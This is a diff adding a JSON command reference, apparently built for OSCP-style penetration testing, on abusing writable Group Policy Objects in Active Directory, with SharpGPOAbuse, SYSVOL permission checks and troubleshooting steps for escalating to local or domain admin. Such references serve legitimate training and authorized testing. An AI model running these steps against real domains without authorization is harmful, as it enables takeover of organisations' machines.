@@ -1,0 +1,211 @@
+{
+  "category": "active-directory",
+  "subcategory": "gpo-abuse",
+  "description": "Group Policy Object abuse techniques for Active Directory privilege escalation",
+  "commands": [
+    {
+      "id": "sharpgpoabuse-add-local-admin",
+      "name": "SharpGPOAbuse - Add Local Administrator",
+      "category": "active-directory",
+      "subcategory": "gpo-abuse",
+      "command": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USERNAME> --GPOName \"<GPO_NAME>\"",
+      "description": "Abuse writable GPO permissions to add a user to the local Administrators group on all machines where the GPO applies. Requires write access to the GPO (check with icacls on SYSVOL).",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GPO_ABUSE",
+        "PRIVILEGE_ESCALATION",
+        "SYSVOL",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "Domain user account to add to local Administrators group",
+          "example": "charlotte",
+          "required": true
+        },
+        {
+          "name": "<GPO_NAME>",
+          "description": "Display name of the GPO with write permissions (use exact name from Get-NetGPO or icacls)",
+          "example": "Default Domain Policy",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "--AddLocalAdmin": "Modifies GPO to add specified user to BUILTIN\\Administrators group via Restricted Groups or Group Policy Preferences. Effect applies when GPO refreshes on target machines (gpupdate /force or next refresh cycle ~90 minutes). WHY: Most direct privilege escalation - local admin grants full control of affected machines.",
+        "--UserAccount": "Target user account to elevate. Must be a valid domain account (domain\\user or just username if in same domain). WHY: Specify which account receives administrative privileges.",
+        "--GPOName": "Case-sensitive GPO display name. Must match exactly as shown in AD (quotes required if contains spaces). Use Get-NetGPO or icacls to find writable GPOs. WHY: Targets specific GPO - choose one that applies to high-value machines (DCs, servers)."
+      },
+      "success_indicators": [
+        "[+] The GPO was modified to include a new local admin",
+        "User added to local administrators",
+        "GPO modification successful"
+      ],
+      "failure_indicators": [
+        "Access is denied",
+        "GPO not found",
+        "The specified user does not exist",
+        "Insufficient permissions to modify GPO"
+      ],
+      "troubleshooting": {
+        "Access is denied": "User lacks write permission on GPO. Verify with: icacls \"\\\\DOMAIN\\SYSVOL\\DOMAIN\\Policies\\{GPO-GUID}\". Look for (F) or (W) permissions on your user/group.",
+        "GPO not found": "GPO name case-sensitive and must match exactly. List GPOs with: Get-NetGPO | select displayname. Use quotes if name contains spaces.",
+        "Changes not taking effect": "GPO changes require refresh. Force with: gpupdate /force. Then MUST re-login to get new token with updated group membership.",
+        "Token not updated after gpupdate": "Windows tokens created at logon. Group membership changes don't affect current sessions. Exit and reconnect (evil-winrm, RDP, etc.) to receive new token."
+      },
+      "notes": "GPO ABUSE CRITICAL PATH:\n1. Identify writable GPO: icacls \"\\\\DOMAIN\\SYSVOL\\DOMAIN\\Policies\\*\"\n2. Look for (F) Full Control or (W) Write on your user\n3. Default Domain Policy applies to ALL domain computers\n4. After modification: gpupdate /force on target\n5. CRITICAL: Must re-login to receive new admin token\n\nOSCP RELEVANCE: HIGH\nGPO abuse is a reliable privilege escalation in misconfigured AD environments. Check SYSVOL permissions on every AD engagement.\n\nMANUAL ALTERNATIVE:\nModify GPO directly via Group Policy Management Console (GPMC) if GUI access available, or edit GptTmpl.inf in SYSVOL directly.\n\nTIME ESTIMATE: 5-10 minutes (including GPO refresh)",
+      "oscp_relevance": "high",
+      "prerequisites": [
+        "icacls-sysvol-check"
+      ],
+      "alternatives": [],
+      "next_steps": [
+        "gpupdate-force",
+        "net-localgroup-administrators"
+      ],
+      "references": [
+        {
+          "title": "SharpGPOAbuse GitHub",
+          "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+        },
+        {
+          "title": "GPO Abuse - HackTricks",
+          "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/gpo-abuse"
+        }
+      ]
+    },
+    {
+      "id": "icacls-sysvol-check",
+      "name": "Check SYSVOL GPO Permissions",
+      "category": "active-directory",
+      "subcategory": "gpo-abuse",
+      "command": "icacls \"\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\*\"",
+      "description": "Enumerate ACL permissions on all GPO folders in SYSVOL to identify GPOs with write access for the current user. Essential first step for GPO abuse attacks.",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GPO_ABUSE",
+        "ENUMERATION",
+        "ACL",
+        "SYSVOL",
+        "OSCP:HIGH"
+      ],
+      "variables": [
+        {
+          "name": "<DOMAIN>",
+          "description": "Active Directory domain name (FQDN format)",
+          "example": "secura.yzx",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "icacls": "Windows built-in command to display or modify Access Control Lists (ACLs) on files/folders. WHY: Native tool, no upload required, works on any Windows system.",
+        "\\\\DOMAIN\\SYSVOL": "UNC path to domain SYSVOL share containing Group Policy Objects. SYSVOL is replicated to all DCs. WHY: GPO definitions stored here - writable GPO = privilege escalation path.",
+        "\\Policies\\*": "Wildcard to enumerate all GPO folders. Each GPO has a GUID folder (e.g., {31B2F340-016D-11D2-945F-00C04FB984F9}). WHY: Check all GPOs at once to find misconfigurations."
+      },
+      "success_indicators": [
+        "USERNAME:(OI)(CI)(F)",
+        "USERNAME:(OI)(CI)(W)",
+        "USERNAME:(OI)(CI)(M)",
+        "Full Control",
+        "Modify"
+      ],
+      "failure_indicators": [
+        "Access is denied",
+        "The network path was not found",
+        "The specified path is invalid"
+      ],
+      "troubleshooting": {
+        "Access is denied": "User lacks read access to SYSVOL (unusual in most AD environments). Try authenticating first or check if SYSVOL share is accessible: dir \\\\DOMAIN\\SYSVOL",
+        "Network path not found": "Domain name incorrect or DNS not resolving domain. Verify with: nslookup DOMAIN or ping DOMAIN. May need to specify DC IP directly.",
+        "No writable GPOs found": "All GPOs properly secured. Try alternative attacks: ACL abuse on user objects, Kerberoasting, AS-REP roasting."
+      },
+      "notes": "GPO PERMISSION LEGEND:\n(F) = Full Control - can modify GPO (JACKPOT)\n(W) = Write - can modify GPO\n(M) = Modify - can modify GPO\n(RX) = Read/Execute - read only\n(OI) = Object Inherit - applies to files\n(CI) = Container Inherit - applies to subfolders\n\nDEFAULT GPO GUIDs:\n{31B2F340-016D-11D2-945F-00C04FB984F9} = Default Domain Policy\n{6AC1786C-016F-11D2-945F-00C04FB984F9} = Default Domain Controllers Policy\n\nOSCP TIP: Default Domain Policy applies to ALL domain computers. Write access here = immediate path to Domain Admin.\n\nTIME ESTIMATE: 1-2 minutes",
+      "oscp_relevance": "high",
+      "prerequisites": [],
+      "alternatives": [
+        "get-netgpo",
+        "powerview-get-netgpo"
+      ],
+      "next_steps": [
+        "sharpgpoabuse-add-local-admin"
+      ]
+    },
+    {
+      "id": "gpupdate-force",
+      "name": "Force GPO Update",
+      "category": "active-directory",
+      "subcategory": "gpo-abuse",
+      "command": "gpupdate /force",
+      "description": "Force immediate refresh of Group Policy on the local machine. Required after GPO modifications to apply changes without waiting for the default 90-minute refresh cycle.",
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GPO",
+        "WINDOWS",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "/force": "Reapplies ALL policy settings regardless of whether they have changed. Without /force, only changed settings are applied. WHY: Ensures GPO modifications take effect immediately. Critical after SharpGPOAbuse or manual GPO edits."
+      },
+      "success_indicators": [
+        "Computer Policy update has completed successfully",
+        "User Policy update has completed successfully",
+        "Updating policy..."
+      ],
+      "failure_indicators": [
+        "The processing of Group Policy failed",
+        "Access is denied",
+        "Windows cannot connect to the domain"
+      ],
+      "troubleshooting": {
+        "Policy update failed": "Check network connectivity to DC. Verify DNS resolution: nslookup DOMAIN. May need to specify DC IP in network settings.",
+        "Changes still not applied after gpupdate": "Some GPO settings require logoff/reboot. For group membership changes, MUST start a NEW SESSION to get updated access token.",
+        "Access token not updated": "Windows creates access tokens at logon. Group membership changes from GPO don't affect running sessions. Exit current shell (evil-winrm, RDP) and reconnect."
+      },
+      "notes": "CRITICAL POST-GPO MODIFICATION:\n1. Run gpupdate /force to apply changes\n2. MUST START NEW SESSION for token refresh\n3. Group membership changes don't affect existing tokens\n4. whoami /groups shows OLD groups until re-login\n5. Verify with: net localgroup administrators\n\nDEFAULT GPO REFRESH CYCLE:\n- Computer policy: 90 minutes (+ random 0-30 min)\n- Domain Controllers: 5 minutes\n- /force bypasses the wait\n\nTIME ESTIMATE: 30 seconds - 2 minutes",
+      "oscp_relevance": "medium",
+      "prerequisites": [],
+      "alternatives": [],
+      "next_steps": [
+        "net-localgroup-administrators"
+      ]
+    },
+    {
+      "id": "net-localgroup-administrators",
+      "name": "Verify Local Administrators Group",
+      "category": "active-directory",
+      "subcategory": "gpo-abuse",
+      "command": "net localgroup administrators",
+      "description": "Display members of the local Administrators group. Use to verify successful GPO abuse or other privilege escalation techniques.",
+      "tags": [
+        "WINDOWS",
+        "ENUMERATION",
+        "PRIVILEGE_ESCALATION",
+        "VERIFICATION",
+        "OSCP:MEDIUM"
+      ],
+      "variables": [],
+      "flag_explanations": {
+        "net localgroup": "Windows built-in command to manage local groups. WHY: Quick verification of group membership without PowerShell.",
+        "administrators": "Built-in local Administrators group (BUILTIN\\Administrators). Members have full control over the local machine. WHY: Verify your user was added after GPO abuse."
+      },
+      "success_indicators": [
+        "Members listed include target username",
+        "The command completed successfully"
+      ],
+      "failure_indicators": [
+        "Access is denied",
+        "The specified local group does not exist"
+      ],
+      "troubleshooting": {
+        "User not in group after gpupdate": "Token not refreshed. MUST start new session (exit evil-winrm, reconnect). Current session retains old token.",
+        "User shows in group but whoami /groups doesn't show Administrators": "This is expected! whoami shows YOUR current token. Group membership and token membership are different until re-login."
+      },
+      "notes": "TOKEN VS GROUP MEMBERSHIP:\n- net localgroup administrators = actual group membership\n- whoami /groups = YOUR current access token\n- These can differ after GPO changes\n- Token only updates on NEW session\n\nVERIFICATION WORKFLOW:\n1. net localgroup administrators → User listed?\n2. If yes but whoami /groups missing Administrators:\n3. Exit session completely\n4. Reconnect (evil-winrm, RDP, etc.)\n5. whoami /groups now shows BUILTIN\\Administrators\n\nTIME ESTIMATE: 10 seconds",
+      "oscp_relevance": "medium",
+      "prerequisites": [],
+      "alternatives": [],
+      "next_steps": []
+    }
+  ]
+}
